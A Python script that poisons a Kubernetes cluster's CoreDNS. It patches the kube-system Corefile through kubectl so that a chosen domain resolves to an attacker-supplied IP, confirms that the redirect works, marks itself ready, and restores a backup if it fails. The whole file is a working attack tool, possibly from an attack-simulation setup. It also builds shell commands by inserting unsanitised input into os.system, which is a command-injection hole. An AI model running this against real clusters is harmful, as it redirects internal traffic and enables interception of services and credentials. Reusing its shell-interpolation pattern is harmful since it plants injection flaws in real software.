import subprocess
import socket
import os
import sys
import time
import logging
import argparse
from string import Template

def read_corefile():
    corefile = open("./backup.corefile", "r").read()
    return corefile
    
def restore():
    corefile = read_corefile()
    patch = Template('kubectl patch cm -n kube-system coredns -p "{\\"data\\":{\\"Corefile\\":\\"$corefile\\"}}"')
    output = patch.substitute(corefile=corefile)
    os.system(output)

def save_corefile(corefile):
    file = open("./backup.corefile", "w")
    file.write(corefile)
    file.close()

def ensure_ready_probe(inserted_host, inserted_ip):
    # check configs
    attempts = 0
    active_ip = ""

    while active_ip != inserted_ip:
        if attempts >= 5:
            return False
        logging.info("Checking if domain points to required IP")    
        time.sleep(10)
        active_ip = socket.gethostbyname(inserted_host)
        attempts += 1
        
    # readiness probe
    f = open("/tmp/ready", "a")
    f.close()
    return True

parser = argparse.ArgumentParser()
parser.add_argument('items', nargs='*')

args = parser.parse_args()

if len(args.items) < 2:
    print('Not enough args provided!')
    os._exit(0)

# host = "zbab.zbab"
# ip = "142.250.74.169"

ip = args.items[0]
host = args.items[1]

rule = Template('\\n$domain {\\n    hosts {\\n        $ip $domain\\n       fallthrough\\n    }\\n}\\n\\"}}')
rule_s = rule.substitute(domain=host, ip=ip)

current_corefile = subprocess.check_output("kubectl get cm -n kube-system coredns -o yaml | yq '.data.Corefile'", shell=True).decode()[1:-2]
save_corefile(current_corefile)

newcorefile = current_corefile + rule_s

patch = Template('kubectl patch cm -n kube-system coredns -p "{\\"data\\":{\\"Corefile\\":\\"$corefile\\"}}"')
output = patch.substitute(corefile=newcorefile)

os.system(output)

try:
    ready = ensure_ready_probe(host, ip)
except:
    restore()
    logging.error("CoreDNS Corefile poisoning could not be applied")
    sys.exit(1)

if ready:
    logging.info("CoreDNS Corefile poisoning applied")
    while True:
        logging.info("CoreDNS Corefile poisoning applied")
        time.sleep(30)
else:
    restore()
    logging.error("CoreDNS Corefile poisoning could not be applied")


